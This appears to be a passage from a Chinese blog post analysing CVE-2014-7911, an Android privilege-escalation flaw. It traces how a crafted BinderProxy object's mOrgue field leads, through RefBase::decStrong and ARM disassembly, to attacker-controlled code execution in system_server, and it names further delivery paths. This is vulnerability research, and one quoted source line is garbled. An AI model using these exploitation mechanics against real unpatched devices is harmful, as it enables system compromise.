<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    IBinder* b = (IBinder*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">    DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">    LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">    drl-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">    b-&gt;decStrong(obj);</span><br><span class="line">    IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码一开始就将gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue强制转换成函数指针，那么gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue是什么鬼？找到BinderProxy服务注册函数int_register_android_os_BinderProxy</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> kBinderProxyPathName = <span class="string">"android/os/BinderProxy"</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">int_register_android_os_BinderProxy</span><span class="params">(JNIEnv* env)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line">    clazz = env-&gt;FindClass(<span class="string">"java/lang/ref/WeakReference"</span>);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class java.lang.ref.WeakReference"</span>);</span><br><span class="line">    gWeakReferenceOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    gWeakReferenceOffsets.mGet = env-&gt;GetMethodID(clazz, <span class="string">"get"</span>, <span class="string">"()Ljava/lang/Object;"</span>);</span><br><span class="line">    assert(gWeakReferenceOffsets.mGet);</span><br><span class="line">    clazz = env-&gt;FindClass(<span class="string">"java/lang/Error"</span>);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class java.lang.Error"</span>);</span><br><span class="line">    gErrorOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    clazz = env-&gt;FindClass(kBinderProxyPathName);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class android.os.BinderProxy"</span>);</span><br><span class="line">    gBinderProxyOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    gBinderProxyOffsets.mConstructor = env-&gt;GetMethodID(clazz, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mConstructor);</span><br><span class="line">    gBinderProxyOffsets.mSendDeathNotice = env-&gt;GetStaticMethodID(clazz, <span class="string">"sendDeathNotice"</span>, <span class="string">"(Landroid/os/IBinder$DeathRecipient;)V"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mSendDeathNotice);</span><br><span class="line">    gBinderProxyOffsets.mObject = env-&gt;GetFieldID(clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mObject);</span><br><span class="line">    gBinderProxyOffsets.mSelfvoid RefBase::decStrong = env-&gt;GetFieldID(clazz, <span class="string">"mSelf"</span>, <span class="string">"Ljava/lang/ref/WeakReference;"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mSelf);</span><br><span class="line">    gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mOrgue);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中可以看到，通过一些列反射通过对象引用计数器获取android.os.BinderProxy对象实例，然后通过</p>
<pre><code>gBinderProxyOffsets.mObject = env-&gt;<span class="constant">GetFieldID(</span>clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);
gBinderProxyOffsets.mOrgue = env-&gt;<span class="constant">GetFieldID(</span>clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);
</code></pre><p>获取其成员变量mObject和mOrgue的值，即获取了AAdroid.os.BinderProxy中的变量mObject和mOrgue的值。而我们可以控制mObject和mOrgue的值，这样就相当于我们可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<p>继续看android_os_BinderProxy_destroy代码，将mOrgue强制转成DeathRecipientList函数指针后会调用函数drl-&gt;decStrong((void*)javaObjectForIBinder)，DeathRecipientList继承RefBase，找到RefBase类中的decStrong方法，位于<a href="http://androidxref.com/4.4.4_r1/xref/system/core/libutils/RefBase.cpp" target="_blank" rel="external">RefBase.cpp</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 成员变量mRefs是在对象的构造函数中初始化</span></span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    <span class="comment">// 强引用数与弱引用数同时减1</span></span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="comment">// 获取强引用数，返回&amp;refs-&gt;mStrong</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="comment">// 如果这是最后一个强引用的话</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个对象销毁过程参考前边介绍的Android指针管理，decStrong中将强引用数与弱引用数同时减1，如果这是最后一个强引用的话，会调用对象的onLastStrongRef，并且判断成员变量mRefs的成员变量mFlags来决定是否在对象的强引用数为0时释放对象。</p>
<p>我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针，所以执行到refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致我们的代码执行。mBase类型为RefBase* const，相当于直接跳到mOrgue地址执行了，即程序崩在了0x1337bef3，r0为函数第一个参数即this指针，所以其值也是0x1337bef3。</p>
<h3 id="反汇编定位崩溃点">反汇编定位崩溃点</h3><p>经过前边的分析已经知道了漏洞成因以及最终漏洞触发函数，但是想要利用漏洞就必须定位到具体的触发崩溃的点，需要知道最后是哪个操作造成的，以及相关寄存器哪些是可控的。</p>
<p>从android4.4.4原生系统中扣出libutil.so文件，然后反汇编android::RefBase::decStrong(void const*) const函数，汇编代码以及说明如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">================ B E G I N N I N G   O F   P R O C E D U R E ================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             _ZNK7android7RefBase9decStrongEPKv:        <span class="comment">// android::RefBase::decStrong(void const*) const</span></span><br><span class="line"><span class="number">0000</span>d172         push       &#123;r4, r5, r6, lr&#125;                                    ; XREF=_ZN7android2spINS_9BlobCache4BlobEED1Ev+<span class="number">10</span>, _ZN7android2spINS_9BlobCache4BlobEEaSERKS3_+<span class="number">22</span>, _ZN7android2spINS_14LooperCallbackEED1Ev+<span class="number">18</span>, _ZN7android2spINS_6ThreadEE5clearEv+<span class="number">18</span>, _ZN7android6Thread3runEPKcij+<span class="number">70</span>, _ZN7android6Thread11_threadLoopEPv+<span class="number">178</span>, _ZN7android6Looper16threadDestructorEPv+<span class="number">6</span>, _ZN7android6Looper12setForThreadERKNS_2spIS0_EE+<span class="number">42</span>, _ZN7android6Looper12setForThreadERKNS_2spIS0_EE+<span class="number">52</span>, _ZN7android2spINS_14LooperCallbackEEaSERKS2_+<span class="number">36</span>, _ZN7android6Looper9pollInnerEi+<span class="number">506</span>, …</span><br><span class="line"><span class="number">0000</span>d174         mov        r5, r0	<span class="comment">// r0为drl的this指针</span></span><br><span class="line"><span class="number">0000</span>d176         ldr        r4, [r0, <span class="preprocessor">#<span class="number">0x4</span>]	<span class="comment">// mRefs是drl父类RefBase虚函数下边第一个私有变量，即为drl虚表下边第一个私有变量，所以地址为this+4</span></span></span><br><span class="line"><span class="number">0000</span>d178         mov        r6, r1</span><br><span class="line"><span class="number">0000</span>d17a         mov        r0, r4	<span class="comment">// &amp;refs-&gt;mStrong为weakref_impl类的第一成员变量，并且其父类weakref_type没有虚函数，所以不存在虚表，所以其地址为r4</span></span><br><span class="line"><span class="number">0000</span>d17c         blx        android_atomic_dec@PLT <span class="comment">// 获取强引用数</span></span><br><span class="line"><span class="number">0000</span>d180         cmp        r0, <span class="preprocessor">#<span class="number">0x1</span>	<span class="comment">// 返回值与1比较</span></span></span><br><span class="line"><span class="number">0000</span>d182         bne        <span class="number">0xd19c</span>	<span class="comment">// 不等跳到0xd19c 该处为漏洞利用的约束条件</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d184         ldr        r0, [r4, <span class="preprocessor">#<span class="number">0x8</span>]	<span class="comment">// weakref_impl类中mBase位于第三个成员变量，所以其地址为r4+8</span></span></span><br><span class="line"><span class="number">0000</span>d186         mov        r1, r6	<span class="comment">// refs-&gt;mBase-&gt;onLastStrongRef参数id</span></span><br><span class="line"><span class="number">0000</span>d188         ldr        r3, [r0]	<span class="comment">// 将mBase地址传给r3，即r3为RefBase类this指针</span></span><br><span class="line"><span class="number">0000</span>d18a         ldr        r2, [r3, <span class="preprocessor">#<span class="number">0xc</span>]	<span class="comment">// 父类weakref_type虚表指针vfptr+私有变量mRefs + 4(onLastStrongRef为第二个虚函数) = 0xC</span></span></span><br><span class="line"><span class="number">0000</span>d18c         blx        r2	<span class="comment">// 调用refs-&gt;mBase-&gt;onLastStrongRef</span></span><br><span class="line"><span class="number">0000</span>d18e         ldr        r0, [r4, <span class="preprocessor">#<span class="number">0xc</span>]</span></span><br><span class="line"><span class="number">0000</span>d190         lsls       r0, r0, <span class="preprocessor">#<span class="number">0x1f</span></span></span><br><span class="line"><span class="number">0000</span>d192         bmi        <span class="number">0xd19c</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d194         ldr        r1, [r5]</span><br><span class="line"><span class="number">0000</span>d196         mov        r0, r5</span><br><span class="line"><span class="number">0000</span>d198         ldr        r3, [r1, <span class="preprocessor">#<span class="number">0x4</span>]</span></span><br><span class="line"><span class="number">0000</span>d19a         blx        r3</span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d19c         mov        r0, r4                                              ; argument <span class="preprocessor">#<span class="number">1</span> for method _ZN7android7RefBase12weakref_type7decWeakEPKv, XREF=_ZNK7android7RefBase9decStrongEPKv+<span class="number">16</span>, _ZNK7android7RefBase9decStrongEPKv+<span class="number">32</span></span></span><br><span class="line"><span class="number">0000</span>d19e         mov        r1, r6</span><br><span class="line"><span class="number">0000</span>d1a0         pop.w      &#123;r4, r5, r6, lr&#125;</span><br><span class="line"><span class="number">0000</span>d1a4         b.w        _ZN7android7RefBase12weakref_type7decWeakEPKv       ; android::RefBase::weakref_type::decWeak(<span class="keyword">void</span> <span class="keyword">const</span>*)</span><br><span class="line">                        ; endp</span><br></pre></td></tr></table></figure>
<p>根据汇编代码可以看出，为实现任意代码执行得满足条件：<br>&amp;refs-&gt;mStrong == 1，即<code>*(*(mOrgue+4)) == 1</code><br>所以总结下来应该是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">	refs = *(mOrgue+<span class="number">4</span>);</span><br><span class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">0xC</span>);</span><br><span class="line">	blx r2 ; &lt;—— controlled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对照反汇编代码更容易看出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> android::RefBase::decStrong(<span class="keyword">void</span> <span class="keyword">const</span>*) <span class="keyword">const</span>(<span class="keyword">void</span> * arg0) &#123;</span><br><span class="line">    r5 = arg0;</span><br><span class="line">    r4 = *(arg0 + <span class="number">0x4</span>);</span><br><span class="line">    r6 = r1;</span><br><span class="line">    <span class="keyword">if</span> (android_atomic_dec() == <span class="number">0x1</span>) &#123;</span><br><span class="line">            r0 = *(r4 + <span class="number">0x8</span>);</span><br><span class="line">            r3 = *r0;</span><br><span class="line">            r2 = *(r3 + <span class="number">0xc</span>);</span><br><span class="line">            (r2)(r0, r6, r2, r3);</span><br><span class="line">            <span class="keyword">if</span> (PARITY(*(r4 + <span class="number">0xc</span>) &lt;&lt; <span class="number">0x1f</span>)) &#123;</span><br><span class="line">                    r1 = *r5;</span><br><span class="line">                    (*(r1 + <span class="number">0x4</span>))(r5, r1);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    r0 = android::RefBase::weakref_type::decWeak(r4);</span><br><span class="line">    <span class="keyword">return</span> r0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后执行的汇编代码地址为<br><code>r2 = *(*(*(refs+8))+0xC) = *(*(*(*(mOrgue+4)+8))+0xC)</code></p>
<h2 id="思考">思考</h2><p>通过分析，其实这个漏洞触发需要的条件就两个：</p>
<ol>
<li>向system_server传递对象，并且system_server会将该对象反序列化。</li>
<li>传递数据前将可序列化的对象修改为不可序列化。</li>
</ol>
<p>第一个问题，是否必须使用Android.os.UserManager.setApplicationRestrictions方法向system_server传递对象？<br>并不是，其实我们需要的是找到一个途径将序列化后的对象传递进system_server进程，并且system_server会将该对象反序列化，只要满足这样的条件均可。这样的系统服务还是很多的，例如frameworks\base\services\java\com\android\server目录下的系统服务，找到相对应的应用层通信调用的地方就可以了。</p>
<p>第二个问题，为什么要将AAdroid.os.BinderProxy修改为Android.os.BinderProxy？<br>漏洞的整个触发过程仅仅是向system_server进程传递了一个恶意对象实例，此时没有任何该对象的方法或者数据被使用，然而由于Java GC机制，当该对象被清理时，GC将调用他的finalize方法。由于finalize方法是不可控的，可控仅仅是该恶意对象，所以漏洞仍然无法利用。回头再看Android.os.BinderProxy，它在其finalize方法中将变量mObject和mOrgue强制转换为函数指针并调用。但是其中mObject和mOrgue的值是可控的，这样就相当于可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<h2 id="漏洞利用">漏洞利用</h2><p><a href="http://blog.idhyt.com/2015/08/01/exploit-cve-2014-7911-exp/">CVE-2014-7911安卓本地提权漏洞利用</a></p>
<h2 id="参考">参考</h2><p><a href="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html" target="_blank" rel="external">CVE-2014-7911安卓本地提权漏洞详细分析</a></p>
</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a data-url="http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/" data-id="cixeykiiu0041mh6i1fmha6mr" class="article-share-link">Share</a><div class="tags"><a href="/tags/cve/">cve</a></div><div class="post-nav"><a href="/2015/08/01/exploit-cve-2014-7911-exp/" class="pre">CVE-2014-7911安卓本地提权漏洞利用</a><a href="/2015/05/11/android-reverse-clickbutton/" class="next">安卓逆向学习笔记-ClickButton</a></div><div id="disqus_thread"><script>var disqus_shortname = 'idhyt';
var disqus_identifier = '2015/07/31/exploit-cve-2014-7911/';
var disqus_title = 'CVE-2014-7911安卓本地提权漏洞分析';
var disqus_url = 'http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/';
(function() {
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//idhyt.disqus.com/count.js" async></script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><input placeholder="Search" type="text" class="st-default-search-input"/></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Social</i></div><ul></ul><a href="http://github.com/idhyt" title="GitHub" target="_blank">GitHub</a><ul></ul><a href="https://twitter.com/idhyt3r" title="Twitter" target="_blank">Twitter</a><ul></ul><a href="http://weibo.com/idhyt" title="Weibo" target="_blank">Weibo</a><ul></ul><a href="http://www.zhihu.com/people/idhyt" title="ZhiHu" target="_blank">ZhiHu</a></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/android/">android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/diary/">diary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/technic/">technic</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/virus/">virus</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/uac/" style="font-size: 15px;">uac</a> <a href="/tags/淘宝客/" style="font-size: 15px;">淘宝客</a> <a href="/tags/过滤/" style="font-size: 15px;">过滤</a> <a href="/tags/盗号/" style="font-size: 15px;">盗号</a> <a href="/tags/推广/" style="font-size: 15px;">推广</a> <a href="/tags/流氓/" style="font-size: 15px;">流氓</a> <a href="/tags/感染/" style="font-size: 15px;">感染</a> <a href="/tags/下载/" style="font-size: 15px;">下载</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/lol/" style="font-size: 15px;">lol</a> <a href="/tags/shellcode/" style="font-size: 15px;">shellcode</a> <a href="/tags/english/" style="font-size: 15px;">english</a> <a href="/tags/challenge/" style="font-size: 15px;">challenge</a> <a href="/tags/task/" style="font-size: 15px;">task</a> <a href="/tags/thread/" style="font-size: 15px;">thread</a> <a href="/tags/驱动/" style="font-size: 15px;">驱动</a> <a href="/tags/cve/" style="font-size: 15px;">cve</a> <a href="/tags/nvidia/" style="font-size: 15px;">nvidia</a> <a href="/tags/kernel/" style="font-size: 15px;">kernel</a> <a href="/tags/symbol/" style="font-size: 15px;">symbol</a> <a href="/tags/libstagefright/" style="font-size: 15px;">libstagefright</a> <a href="/tags/pingpongroot/" style="font-size: 15px;">pingpongroot</a> <a href="/tags/iovyroot/" style="font-size: 15px;">iovyroot</a> <a href="/tags/pxn/" style="font-size: 15px;">pxn</a> <a href="/tags/无法描述/" style="font-size: 15px;">无法描述</a> <a href="/tags/smali/" style="font-size: 15px;">smali</a> <a href="/tags/debug/" style="font-size: 15px;">debug</a> <a href="/tags/xposed/" style="font-size: 15px;">xposed</a> <a href="/tags/adb/" style="font-size: 15px;">adb</a> <a href="/tags/webview/" style="font-size: 15px;">webview</a> <a href="/tags/android/" style="font-size: 15px;">android</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/01/01/diary-annual-summary-2016/">我的2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/09/exploit-kernel-security-flaws/">KERNEL SECURITY FLAWS (0day for nexus4)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/exploit-illegal-access-caused-by-an-empty-list/">ILLEGAL ACCESS CAUSED BY AN EMPTY LIST</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/24/exploit-cve-2016-5195/">CVE-2016-5195</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/04/exploit-perf_event-vul/">PERF_EVENT VUL</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/exploit-bypass-pxn/">绕过PXN保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/07/exploit-cve-2015-1805/">CVE-2015-1805</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/09/exploit-process-descriptor/">进程描述符</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/exploit-kernel-symbol-usage/">如何优雅的使用内核符号表</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/diary-stay-away-trip/">一场说走就走的旅行</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> Recent Comments</i></div><script type="text/javascript" src="//idhyt.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="http://blog.idhyt.com/about" title="About" target="_blank">About</a><ul></ul><a href="undefined" title="undefined" target="_blank"></a><ul></ul><a href="undefined" title="undefined" target="_blank"></a><ul></ul><a href="undefined" title="undefined" target="_blank"></a><ul></ul><a href="undefined" title="undefined" target="_blank"></a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">© <a href="/." rel="nofollow">idhyt's blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><!-- a(rel='nofollow', target='_blank', href='https://github.com/tufu9441/maupassant-hexo')  Theme--><!-- |  by--><!-- a(rel='nofollow', target='_blank', href='https://github.com/pagecho')  Cho.--></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="/css/jquery.fancybox.css?v=0.0.0"><script>(function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
(w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
})(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

_st('install','sVJDxDCDcUGeK1KkM6zN','2.0.0');
</script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create','UA-71783676-1','auto');ga('send','pageview');
</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?5228d77c5752954f270fcca0908555af";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>